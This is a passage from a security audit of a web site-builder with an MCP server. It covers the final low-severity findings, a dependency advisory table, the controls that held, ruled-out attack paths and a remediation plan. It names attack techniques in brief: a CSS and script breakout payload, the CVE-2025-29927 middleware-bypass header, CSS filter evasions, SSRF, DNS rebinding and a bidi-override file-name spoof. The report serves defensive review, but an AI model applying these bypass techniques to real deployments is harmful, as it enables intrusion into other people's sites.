#### NVX-065 — The remaining audit items are dev-only or in code paths the shipped app never loads

`vitest`/`@vitest/mocker` (needs an exposed Vite server), `glob` (a CLI flag, pulled in by the
ESLint plugin), `js-yaml` (ESLint), `nanoid` (a runtime dependency of postcss, but the advisory
needs `customAlphabet` with size 0, which postcss never calls), and `qs`/`hono` (inside the MCP
SDK's HTTP transports; `mcp-server.ts:654` uses stdio only). Two corrections from the verifiers:
`fast-uri` is loaded on the stdio path through `ajv`, but nothing fetches the URIs it parses; and
`npm audit fix` crashes on this lockfile with npm 10 (an arborist peer-set error) and needs
`--legacy-peer-deps`, so bump the direct ranges by hand and `npm update` the transitives. A release
gate of `npm audit --omit=dev --audit-level=high` will not pass on Next 14 without a dated exception
list; that is the honest state until NVX-004 is done.

### Info (continued)

- **NVX-063** — The Origin check compares hosts, not full origins (`src/middleware.ts:109`), so an
  `https` Origin is accepted by the plain-http server. Necessary today behind a TLS-terminating
  proxy; no practical exploit. When the trusted-proxy option (NVX-034) lands, compare the full
  origin using `X-Forwarded-Proto`.
- **NVX-066** — `sanitizeCssValue()` (`src/lib/css-value.ts:17`) keeps quotes, and the hex check
  accepts a value without `#`. No breakout is possible (a `</style><script>` font payload came out
  inert). An accent of `6366f1` makes the property invalid at computed-value time, so buttons lose
  their background rather than falling back to the default. Normalise the accent and strip quotes.
- **NVX-067** — The iframe `allow` attribute survives sanitising (`src/lib/sanitize.ts:32`). In the
  builder the `Permissions-Policy` header and `frame-src` neutralise it; the exported site has
  neither, so a framed origin can be delegated camera, microphone or payment on the customer's
  domain after a visitor clicks Allow. Restrict `allow` to the tokens the embed hosts need and ship
  the export meta CSP (NVX-001).
- **NVX-068** — JSON route handlers send no `Cache-Control`. Nothing caches them by default (no
  validators, and nginx and common CDNs skip JSON), so this needs a misconfigured proxy; add
  `Cache-Control: no-store` for `/api/:path*` in `headers()`. The RSC cache-poisoning angle from the
  raw finding does not apply to dynamic route handlers.
- **NVX-069** — `robots.txt` exists only under `/sites/<slug>/`, where crawlers never look; the
  builder root answers 404 and the admin pages carry no `noindex`. Only matters in N. Add
  `robots: { index: false }` to the builder layout metadata and a root `robots.ts`.
- **NVX-070** — "View live" (`src/components/editor/PublishButton.tsx:30`) and two links in
  `src/app/(builder)/admin/sites/[id]/page.tsx:45,129` open a new tab without `rel`. Current
  browsers imply `noopener` and the CSP prevents script on the target; three one-token edits.
- **NVX-071** — Media names and alt text keep `<`, `>` and bidi-override characters
  (`src/lib/media.ts:20`). Rendered through JSX, so no XSS; an RTL override can make a file
  masquerade as another name in the picker. Strip `\p{Cf}` and normalise.
- **NVX-072** — `tsconfig.tsbuildinfo` is committed; its 879 paths are all relative, so nothing
  leaks. Ignore it.
- **NVX-073** — `X-DNS-Prefetch-Control: on` is set on every response (`next.config.js:38-41`).
  Redundant over plain HTTP; over HTTPS (P) it re-enables prefetch that browsers default off, so
  external link hosts in content are resolved before a click. Set it to `off`.

## 5. Dependency audit

`npm audit --json` against the committed lockfile reports 13 advisories (1 critical, 7 high,
5 moderate) across 712 packages. Each was checked against the installed version and against whether
the vulnerable code path is reachable from this application.

| Package | Installed | Advisory summary | Reachable here? | Fix |
| --- | --- | --- | --- | --- |
| `next` | 14.2.33 | 25 advisories: RSC deserialisation DoS ×2 (fixed 14.2.34/.35), Windows unauthenticated RCE, AVIF image RCE, image optimizer DoS ×2, cache poisoning, CSP-nonce XSS, middleware bypass, Server Action SSRF, others | RSC DoS: yes, reachable without Server Actions. Windows RCE: yes on Windows hosts. AVIF RCE: latent (needs `sharp`, not installed). Image optimizer DoS: yes, `/_next/image` is live with a wildcard pattern (NVX-012). CSP-nonce XSS: mitigated, the middleware overwrites inbound CSP headers. Middleware bypass CVE-2025-29927: fixed in 14.2.25, verified refused. | `next@14.2.35` now (NVX-010); 15.5.x/16.x migration (NVX-004); `images.unoptimized: true` meanwhile |
| `postcss` | 8.5.26 (top level); 8.4.31 nested under `next` | Source-map file read via `sourceMappingURL`; `</style>` in stringified output | No: the runtime sanitiser uses 8.5.26, which does not load maps (tested); the nested copy only processes the repository's own CSS at build time; `neutralizeStyleEnd()` covers the second | Clears with the Next upgrade (NVX-064) |
| `sanitize-html` | 2.17.5 | mXSS via `</textarea/>` (2.17.6); SMIL `values` URI bypass (2.17.7) | No: `textarea`, `xmp`, `animate`, `set` are not in any allowlist; both proof-of-concepts return neutralised | `sanitize-html@^2.17.7` (NVX-035) |
| `eslint-config-next` / `@next/eslint-plugin-next` / `glob` | 14.2.15 / 10.3.10 | `glob` CLI command injection via `-c` | No: CLI flag, dev only, never invoked | `eslint-config-next@14.2.35` to match `next`; `overrides` for `glob` |
| `vitest` / `@vitest/mocker` | 4.1.10 | Path traversal through the mocker on an exposed Vite server | No: `environment: "node"`, no browser mode or exposed server | `vitest@^4.1.11` |
| `fast-uri` | 3.1.5 | Host confusion and SSRF via URI normalisation | Loaded on the MCP stdio path through `ajv`, but nothing performs a request on parsed URIs | `npm update fast-uri` |
| `hono` / `qs` | 4.13.1 / 6.x | DoS and parser issues in the MCP SDK's HTTP transports | No: `mcp-server.ts:654` uses `StdioServerTransport` only; verified with a module-load trace | `npm update hono qs` |
| `nanoid` | 3.3.x | Infinite loop with `customAlphabet` and size 0 | No: postcss calls `nanoid(6)` from the non-secure build | `npm update nanoid` |
| `js-yaml` | 4.x | CPU exhaustion on merge keys | No: ESLint only | `npm update js-yaml` |

Two practical notes from the verification pass. `npm audit fix` crashes on this lockfile with
npm 10 (an arborist peer-set error on `vitest`'s optional browser peer) and needs
`--legacy-peer-deps`, so bump the direct ranges by hand and `npm update` the transitives. And an
audit gate in CI cannot pass on Next 14 without a dated exception list; that is the honest state
until the major upgrade lands.

Beyond the advisories, two placement problems matter for supply chain: `prisma`, `tsx`,
`tailwindcss` and `autoprefixer` are `devDependencies` although the launcher, the scripts and the
download route need them at run time, and every one of them is reached through `npx`, which falls
back to the registry when the local binary is missing (NVX-022). The lockfile itself is sound:
version 3, every entry resolved from `registry.npmjs.org` with an integrity hash, no git or HTTP
dependencies, and Prisma verifies engine checksums on download.

## 6. What the code does well

The verifiers ran roughly 80 payloads against the CSS sanitiser, 55 against the SVG sanitiser and a
comparable set against the HTML sanitiser and the request boundary. These controls held, and a
report that only listed gaps would misrepresent the codebase:

- **The Origin check is careful about the cases it does handle.** `Origin: null`, trailing-dot
  hosts, port mismatches, a `Forwarded:` header, comma-separated `X-Forwarded-Host`,
  `X-HTTP-Method-Override` and the CVE-2025-29927 `x-middleware-subrequest` bypass are all refused;
  IPv6 and case are normalised. The gap is the missing Host allowlist (NVX-002), not the comparison.
- **The CSP is nonce-based with `strict-dynamic`, applied to every route including uploads, and
  inbound CSP or nonce headers are overwritten**, which removes the precondition of the Next.js
  CSP-nonce advisory. Inline handlers and `javascript:` links were confirmed blocked in a browser.
- **No CORS headers anywhere**, so cross-origin reads of the GET routes are blocked by the browser;
  this is also what neutralises the `X-Forwarded-Host` weakness for browser attackers (NVX-034).
- **The custom-CSS sanitiser is parser-based and resisted everything tried**: escaped `url(`,
  `@im\port`, `url()` inside custom properties, `image-set`, `src()`, `@font-face` sources,
  `@import` inside `@supports`, `</style>` in strings, comments and selectors. Its one weakness is
  recursion depth (NVX-019), not a bypass.
- **The SVG sanitiser is parser-based** and stripped `<script>`, `<foreignObject>`, SMIL, `<use>`,
  `<style>`, CDATA, processing instructions, entity- and control-character-obfuscated handlers and
  `data:text/html` images. Only the namespace-prefix case (NVX-025) and the regex-based `style`
  cleaner (NVX-044) got through.
- **Every read-only render goes through the HTML sanitiser**, including MCP-written content and
  the generated legal pages; head metadata, `alt`, `lang` and the default header are escaped by
  React; the sitemap escapes XML and ignores `Host`.
- **Upload names never reach the disk**: a generated base-36 name plus a validated extension;
  traversal in every encoding tried was rejected by the media routes, the stock manifest reader
  and the export's asset collector; zip entry names cannot escape the extraction directory.
- **The image header parser is bounds-checked** and returned in about a millisecond on a 50 MB
  hostile buffer.
- **Form submissions are stored as an opaque string and rendered as text**, with no IP, user
  agent or referrer, and a 64 KB cap per row.
- **Production error responses carry no stack traces or paths.**
- **The MCP server validates the block envelope, routes deletes through the trash, keeps stdout
  clean for the protocol, refuses to generate legal pages from an incomplete profile, and uses
  stdio only.**
- **First-run and reset are careful with data**: the schema push refuses loss unless the dropped
  column is on an explicit allow-list, and `db:reset` builds the new database beside the live one.
- **The static export contains no scripts, no Next runtime and no third-party assets** unless a
  content author put them there; templates reference bundled photographs only; the 74 photographs
  have complete attribution and no EXIF data.
- **`sharp` is not installed**, which keeps the AVIF RCE advisory latent; keep it that way until
  Next is upgraded.

## 7. Considered and ruled out

Raised during the review, examined, and not carried as findings, so they need not be raised again:

- **SSRF through the download route's self-fetch.** `new URL(req.url).origin` under `next start`
  does not come from the `Host` header. With `Host`, `X-Forwarded-Host` and a canary listener, the
  listener was never contacted and the zip was byte-identical. Only the scheme is trusted
  (NVX-026).
- **The first-run demo seed "silently fails".** The reviewer's own observation was real but caused
  by running `prisma db push --skip-generate` after `npm ci`, which left a client generated before
  `.env` existed. Prisma Client 5.22 loads `.env` through the path recorded at generate time, and
  `scripts/first-run.js` deliberately runs `db push` without `--skip-generate` before seeding, so the
  documented `npm run desktop` path seeds correctly (reproduced in an isolated copy). What remains
  is a fragility for `npm run db:seed` straight after `npm install` and for MCP configs without an
  `env` block; it is on the launch checklist, not here.
- **postcss `sourceMappingURL` file read.** Not reachable (NVX-064).
- **`sanitize-html` advisories.** Not reachable with the current allowlists (NVX-035).
- **`javascript:` links in the builder itself.** Blocked by the nonce CSP in every test; the
  exposure is the exported site (NVX-001).
- **Attribute-selector CSS exfiltration on the builder origin.** Not reachable: `<style>`
  elements are discarded and `sanitizeCss()` strips `url()`; what remains is a fixed per-view beacon
  (NVX-006, NVX-033).
- **The AVIF image RCE.** Needs `sharp`, which is absent (NVX-012, NVX-004).
- **HTML sniffing of uploads on a static host.** A host that sends a `Content-Type` by extension
  never sniffs an image type up to HTML (NVX-061).
- **Prototype pollution through pasted or imported block trees.** `__proto__` and
  `constructor.prototype` keys stay own data properties through the clipboard, tree utilities and
  import.
- **Object-typed ids as Prisma filter fragments.** `findUnique` rejects a non-scalar id with a
  validation error rather than matching (NVX-049).
- **The launcher's port argument reaching a shell.** It is `parseInt`-ed before the spawn.
- **Windows-backslash traversal on the media routes.** Rejected: any `..` is refused before a
  path is built.

## 8. Remediation plan

Ordered by risk reduction per hour. The first block is about a day's work and removes every high
finding except the major upgrade; the second block closes the resource-exhaustion and
content-validation findings with one shared validator; the rest is documentation, hygiene and the
migration.

| Order | Change | Findings | Effort |
| --- | --- | --- | --- |
| 1 | `-H 127.0.0.1` in the launcher and the `start` script; `HOST` opt-out; Docker `-p 127.0.0.1:3000:3000` | NVX-003 | 1 h |
| 2 | Host allowlist in the middleware for every method, 421 otherwise; `X-Forwarded-Host` only behind `NEURAVEX_TRUST_PROXY` | NVX-002, NVX-034, NVX-063 | 2–4 h |
| 3 | `npm i next@14.2.35 sanitize-html@^2.17.7 vitest@^4.1.11`, `npm update` transitives; `images: { unoptimized: true }`; `poweredByHeader: false`, COOP/CORP, `Cache-Control: no-store` on `/api`, DNS prefetch off | NVX-010, NVX-035, NVX-065, NVX-012, NVX-046, NVX-068, NVX-073 | 2 h |
| 4 | One block-tree validator (zod, per-type props, depth 32, node and byte caps, `isSafeHref()`, colour and length checks, integer `sortOrder`) on every write path: save, PATCH, page create, import, paste, MCP, saved blocks, revision restore; render-time guards; error boundary; meta CSP in exported pages | NVX-001, NVX-007, NVX-013, NVX-014, NVX-015, NVX-024 (server half), NVX-067 | 2 days |
| 5 | Inline-text sanitiser profile in `Editable.tsx`; `id` prefixing and `style` filtering in `sanitizeHtml()`; `data:` only on `img`; `rel` on `_blank` | NVX-024, NVX-045, NVX-006, NVX-048 | 1 day |
| 6 | Body-size helper (Content-Length plus streamed cap) on every JSON and multipart route; submissions rate and count limits; import size and page caps; `customCss` byte cap; iterative `cssFunctionCalls()` | NVX-016, NVX-017, NVX-018, NVX-019 | 1 day |
| 7 | Validate the accent and site fields on every write path (import shares the settings validators; slugify and de-duplicate on import); filter the export stylesheet | NVX-008, NVX-027, NVX-049, NVX-S002, NVX-009 | 1 day |
| 8 | Exact-hostname embed list shared by sanitiser and CSP; `allow` restricted; SVG local-name check and postcss-based `style` cleaning; magic-byte check and EXIF strip on upload | NVX-023, NVX-067, NVX-025, NVX-044, NVX-061, NVX-059 | 1 day |
| 9 | Serve `/uploads/*` through a route handler with realpath containment; `readdir` keeps regular files only; upload route returns 400 on bad input | NVX-005, NVX-054, NVX-047 | ½ day |
| 10 | Await the PRAGMAs; `select` only what the public page needs and pass DTOs; in-process render for the download with `try/catch`; `PUBLIC_URL` for sitemap, robots and `metadataBase`; escape header and footer substitutions | NVX-030, NVX-S001, NVX-026, NVX-041, NVX-051, NVX-062 | 1 day |
| 11 | Move `prisma`, `tsx`, `tailwindcss`, `autoprefixer` to `dependencies`; resolve binaries with `require.resolve` instead of `npx`; `CHECKPOINT_DISABLE`; `setup-mcp.sh` backs up and merges, writes `cwd` and `env`; MCP results carry a data envelope, deletes need `confirm` | NVX-022, NVX-055, NVX-053, NVX-S003 | ½ day |
| 12 | Legal defaults tri-state; the exported form neutralised; the audit parses HTML and scans every string prop, counts `href` only on `<link>`; submissions delete, export and pagination | NVX-040, NVX-020, NVX-021, NVX-056, NVX-057, NVX-058 | 1½ days |
| 13 | Rewrite the nginx and Docker examples; ship `Dockerfile` + `.dockerignore`; backup and single-tenant text; Node policy; `SECURITY.md`; changelog and tag; `chmod 0600` the database; `noindex` on builder pages; root `robots.txt`; ignore `tsbuildinfo` | NVX-036, NVX-011, NVX-037, NVX-052, NVX-028, NVX-039, NVX-050, NVX-069, NVX-072, NVX-038 | 1½ days |
| 14 | Middleware unit test; e2e in CI against `next start`; SHA-pinned actions, `permissions`, audit gate with exception list, Dependabot; launcher process group and busy-port handling; media scan scoped to one site; download cache | NVX-029, NVX-060, NVX-031, NVX-042, NVX-043, NVX-070, NVX-071, NVX-066 | 1½ days |
| 15 | Next.js 15.5.x / 16.x migration with the full suite as the gate | NVX-004 | 2–4 days |

## 9. Coverage and limits of this review

Examined in full: every file named in §2. Tested dynamically: the request boundary, all sanitisers,
the upload and media routes, the download and export, the MCP server over stdio, the launcher's
process and socket behaviour, the first-run and reset scripts, the resource-exhaustion paths, and
the Docker example's individual steps. A completeness pass checked that every file under
`src/app/api` and `src/lib` appears in at least one reviewer's coverage notes and that every
`dangerouslySetInnerHTML`, `fetch(`, `readFile`, `JSON.parse`, `new URL(` and `execCommand` site is
accounted for; it found the three findings marked `NVX-S`.

Not done, and why:

- **The DNS rebinding browser hop.** No DNS control in this environment; the server-side
  acceptance was reproduced with forged headers, and current browser behaviour was taken from the
  verifiers' knowledge of Chromium's Local Network Access and Firefox's prompt.
- **The Next.js Windows RCE and the RSC CPU-hang payload.** Linux host; payloads not public.
  Version facts and reachability were verified instead.
- **A multi-gigabyte object through the image optimizer.** The upstream fetch was demonstrated;
  the memory and disk exhaustion outcome was not exercised end to end.
- **`docker build`.** The CLI is present but no daemon; each step of the Dockerfile was reproduced
  by hand.
- **Windows launcher behaviour.** No Windows host.
- **Sustained-load behaviour of Prisma's connection pool.** Out of scope for a code review; the
  single-writer contention case was measured.
